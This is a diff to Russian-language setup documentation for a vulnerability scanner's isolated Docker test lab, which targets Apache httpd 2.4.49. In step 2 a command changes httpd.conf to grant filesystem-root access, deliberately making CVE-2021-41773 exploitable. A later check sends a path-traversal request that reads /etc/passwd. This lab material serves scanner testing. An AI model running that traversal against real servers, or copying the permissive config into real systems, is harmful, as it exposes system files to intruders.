@@ -321,8 +321,12 @@ docker compose exec app scanner feeds sync-nvd --file /data/nvdcve-2.0-2024.json
 - Контейнер `app` дополнительно подключается к `lab-net`, чтобы видеть цель.
 - У `lab-web` **нет** опубликованных портов (`-p` не используется), поэтому он
   не конфликтует с портами хоста и не виден из вашей сети.
-- `vulhub/httpd:2.4.49` — Apache с известной уязвимостью CVE-2021-41773
-  (обход каталога). На ней удобно проверять привязку находок к БДУ.
+- Цель — официальный образ `httpd:2.4.49` (Apache с CVE-2021-41773, обход
+  каталога). Сама уязвимость эксплуатируется, только если в конфиге открыт
+  доступ к корню ФС (`Require all granted` в `<Directory />`), а в образе по
+  умолчанию стоит `denied`. Поэтому в шаге 2 конфиг меняется одной командой.
+  Так Nuclei подтверждает CVE реальным запросом, а сопоставление по версии
+  находит остальные уязвимости Apache 2.4.49 в БДУ.
 
 ### Шаг 1. Создать сеть стенда
 
@@ -339,7 +343,11 @@ this address space` значит, что подсеть занята: возьм
 ### Шаг 2. Запустить учебную цель
 
 ```bash
-docker run -d --name lab-web --network lab-net --ip 172.30.0.10 vulhub/httpd:2.4.49
+docker run -d --name lab-web --network lab-net --ip 172.30.0.10 httpd:2.4.49
+# открыть корень ФС в конфиге — условие эксплуатации CVE-2021-41773
+docker exec lab-web sed -i '/<Directory \/>/,/<\/Directory>/ s/Require all denied/Require all granted/' \
+    /usr/local/apache2/conf/httpd.conf
+docker restart lab-web
 docker ps --filter name=lab-web     # STATUS: Up
 ```
 
@@ -348,7 +356,7 @@ docker ps --filter name=lab-web     # STATUS: Up
 
 ### Шаг 3. Подключить сканер к сети стенда
 
-Команда выполняется из каталога сканера:
+Команды выполняются из каталога сканера:
 
 ```bash
 docker network connect lab-net "$(docker compose ps -q app)"
@@ -360,6 +368,15 @@ docker network connect lab-net "$(docker compose ps -q app)"
 docker compose exec app python -c \
   "import urllib.request; print(urllib.request.urlopen('http://172.30.0.10/').status)"
 # 200
+```
+
+Проверка, что цель действительно уязвима (ожидается `b'root:x:0:0...`;
+`403` значит, что правка конфига из шага 2 не применилась):
+
+```bash
+docker compose exec app python -c "import urllib.request as u, urllib.error as e
+try: print(u.urlopen('http://172.30.0.10/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd').read()[:40])
+except e.HTTPError as x: print(x.code)"
 ```
 
 Подключение к `lab-net` сохраняется при `docker compose restart`, но
